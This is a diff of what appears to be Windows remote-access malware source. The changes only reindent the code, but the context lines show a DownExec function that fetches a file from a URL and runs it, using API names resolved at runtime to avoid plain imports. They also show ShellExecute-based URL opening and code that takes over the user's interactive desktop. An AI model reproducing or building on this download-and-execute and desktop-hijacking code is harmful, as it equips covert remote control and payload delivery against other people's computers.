@@ -128,7 +128,7 @@ void DownExec(char url[])
 	hwininet=LoadLibraryW(L"wininet.dll");
 
 	void (WINAPI *DOWNFILE)  (void*, LPCSTR, LPCSTR, DWORD, DWORD, void*);
-    BOOL (WINAPI * CACHEINFO) (LPCSTR, LPINTERNET_CACHE_ENTRY_INFO, LPDWORD);
+	BOOL (WINAPI * CACHEINFO) (LPCSTR, LPINTERNET_CACHE_ENTRY_INFO, LPDWORD);
 	(FARPROC&)DOWNFILE= GetProcAddress(hurlmon,"URLDownloadToCacheFileA");
 	(FARPROC&)CACHEINFO= GetProcAddress(hwininet,"GetUrlCacheEntryInfoA");
 	
@@ -161,7 +161,7 @@ void OpenUrl(char url[])
 	(FARPROC&)SHELLRUN=GetProcAddress(hshell,"ShellExecuteA");
 
 	SHELLRUN(GetDesktopWindow(),"open",url,NULL,NULL,5); 
-    FreeLibrary(hshell);
+	FreeLibrary(hshell);
 }
 
 BOOL OpenUserDesktop()
@@ -172,14 +172,14 @@ BOOL OpenUserDesktop()
 	HWINSTA hwinsta;
 	
 	hwinstaCurrent = GetProcessWindowStation();
-    if (hwinstaCurrent == NULL)
+	if (hwinstaCurrent == NULL)
 		return FALSE;
 	
-    hdeskCurrent = GetThreadDesktop(GetCurrentThreadId());
+	hdeskCurrent = GetThreadDesktop(GetCurrentThreadId());
 	if (hdeskCurrent == NULL)
 		return FALSE;
 	
-    hwinsta = OpenWindowStation(_T("winsta0"), FALSE,
+	hwinsta = OpenWindowStation(_T("winsta0"), FALSE,
 		WINSTA_ACCESSCLIPBOARD   |
 		WINSTA_ACCESSGLOBALATOMS |
 		WINSTA_CREATEDESKTOP     |
@@ -189,13 +189,13 @@ BOOL OpenUserDesktop()
 		WINSTA_READATTRIBUTES    |
 		WINSTA_READSCREEN        |
 		WINSTA_WRITEATTRIBUTES);
-    if (hwinsta == NULL)
+	if (hwinsta == NULL)
 		return FALSE;
 	
-    if (!SetProcessWindowStation(hwinsta))
+	if (!SetProcessWindowStation(hwinsta))
 		return FALSE;
 	
-    hdesk = OpenDesktop(_T("default"), 0, FALSE,
+	hdesk = OpenDesktop(_T("default"), 0, FALSE,
 		DESKTOP_CREATEMENU      |
 		DESKTOP_CREATEWINDOW    |
 		DESKTOP_ENUMERATE       |
